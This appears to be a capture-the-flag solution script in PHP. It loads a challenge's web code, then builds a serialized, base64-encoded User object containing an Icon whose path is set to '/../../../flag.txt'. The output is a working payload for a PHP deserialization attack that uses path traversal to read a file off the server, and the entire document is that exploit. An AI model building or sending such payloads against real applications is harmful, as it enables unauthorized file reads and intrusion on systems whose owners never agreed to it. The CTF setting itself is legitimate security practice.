<?php
ob_start();
include("handout/web/index.php");
ob_clean();

$icon = new Icon('A');
$icon->path = "/../../../flag.txt";

$user = new User(["name"=> $icon]);

$serialized = serialize($user);
$str = base64_encode($serialized);

print $str . "\n";
